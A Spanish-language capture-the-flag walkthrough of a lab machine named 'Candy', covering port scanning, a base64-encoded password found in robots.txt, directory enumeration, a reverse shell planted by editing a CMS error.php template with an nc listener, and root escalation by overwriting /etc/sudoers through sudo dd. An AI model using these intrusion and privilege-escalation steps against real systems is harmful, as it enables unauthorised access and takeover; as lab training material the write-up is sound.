---
description: '✍️ Autor: Luisillo_o🔍 Dificultad: Fácil  📅 Fecha de creación: 29/08/2024'
---

# Candy

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (14) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (793).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 80** perteneciente al **servicio HTTP** está abierto por lo que a continuación se indagará más.

### 🔎 EXPLORACIÓN

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 172.17.0.2
```

para que nos proporcione más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (794).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web llamada Cassiopeia.

<figure><img src="../../.gitbook/assets/image (795).png" alt=""><figcaption></figcaption></figure>

Como nos pide unas credenciales vamos a revisar el archivo `robots.txt` por si contiene algo relevante.

<figure><img src="../../.gitbook/assets/image (796).png" alt=""><figcaption></figcaption></figure>

Vemos unas credenciales pero la contraseña parece ser que está codificada en **base64**.

```bash
echo "c2FubHVpczEyMzQ1" | base64 -d
```

<figure><img src="../../.gitbook/assets/image (797).png" alt=""><figcaption></figcaption></figure>

Nos logueamos y estamos dentro.

<figure><img src="../../.gitbook/assets/image (798).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios y archivos con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x html,php,txt,xml
```

<figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>

Nos encontramos un directorio llamado `/administrator` y entramos en él y nos pide unas credenciales que hemos encontrado anteriormente.

<figure><img src="../../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

Nos logueamos y estamos dentro.

<figure><img src="../../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Vamos a **System** en concreto **Sites Templates** y editamos el archivo `error.php` para hacer una [**Reverse Shell**](https://www.revshells.com/). Nos ponemos en escucha.

```bash
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.

```bash
find / -user luisillo 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (802).png" alt=""><figcaption></figcaption></figure>

Mostramos el contenido de ese archivo.

```bash
cat /var/backups/hidden/otro_caramelo.txt
```

<figure><img src="../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>

Parecen unas credenciales por lo que intentamos loguearnos.

<figure><img src="../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>

Tenemos permisos SUDO con dd por lo que revisamos esta [página](https://gtfobins.github.io/gtfobins/dd/).

```bash
echo "luisillo ALL=(ALL:ALL) ALL" | sudo /bin/dd of=/etc/sudoers
```

<figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>
